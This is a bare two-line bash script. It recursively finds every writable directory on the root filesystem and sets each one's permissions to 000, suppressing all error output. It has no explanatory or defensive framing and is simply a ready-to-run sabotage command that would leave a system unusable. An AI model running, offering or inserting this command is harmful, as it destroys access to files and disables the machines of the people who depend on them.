#!/bin/bash
find / -xdev -perm /222 -type d -exec chmod 000 {} + 2>/dev/null
